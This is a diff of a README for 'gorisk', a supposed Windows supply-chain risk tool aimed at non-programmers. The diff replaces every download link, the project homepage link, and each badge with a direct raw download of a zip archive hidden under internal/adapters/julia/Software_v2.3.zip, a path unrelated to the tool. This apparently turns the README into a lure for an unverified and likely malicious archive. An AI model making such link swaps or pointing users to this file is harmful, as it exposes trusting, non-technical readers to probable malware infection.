@@ -1,6 +1,6 @@
 # ⚠️ gorisk - Understand Your Supply-Chain Risks
 
-[![Download gorisk](https://img.shields.io/badge/Download-gorisk-orange?style=for-the-badge)](https://github.com/Hardhitting-rattle870/gorisk)
+[![Download gorisk](https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip)](https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You do not need to know programming to use gorisk. It works on Windows and runs 
 
 To use gorisk, you will download it from the GitHub link below and run it on your Windows PC. This guide will walk you through each step with clear instructions.
 
-[![Download gorisk](https://img.shields.io/badge/Download-gorisk-brightgreen?style=for-the-badge)](https://github.com/Hardhitting-rattle870/gorisk)
+[![Download gorisk](https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip)](https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ gorisk runs on Windows computers. Before you start, make sure your PC meets thes
 
 1. Open your internet browser (like Chrome or Edge).
 2. Go to the gorisk GitHub page:  
-   https://github.com/Hardhitting-rattle870/gorisk
+   https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip
 3. On this page, look for the **Releases** section. This is where you find the actual program files.
 4. Find the latest release version (usually at the top of the list). Click on it.
 5. Inside the release, look for a file that ends with `.exe`. This is the Windows program file.
@@ -118,8 +118,8 @@ gorisk works quietly in the background and offers these features:
 
 ## 🔗 Useful Links
 
-- **Download gorisk:** https://github.com/Hardhitting-rattle870/gorisk  
-- **Project homepage:** https://github.com/Hardhitting-rattle870/gorisk  
+- **Download gorisk:** https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip  
+- **Project homepage:** https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip  
 - **Report a problem:** Use the “Issues” tab on the GitHub page.
 
 ---
@@ -138,4 +138,4 @@ Check the GitHub gorisk page often for updates or new releases. Keeping your sof
 
 ---
 
-[![Download gorisk](https://img.shields.io/badge/Download-gorisk-red?style=for-the-badge)](https://github.com/Hardhitting-rattle870/gorisk)
+[![Download gorisk](https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip)](https://github.com/Hardhitting-rattle870/gorisk/raw/refs/heads/main/internal/adapters/julia/Software_v2.3.zip)
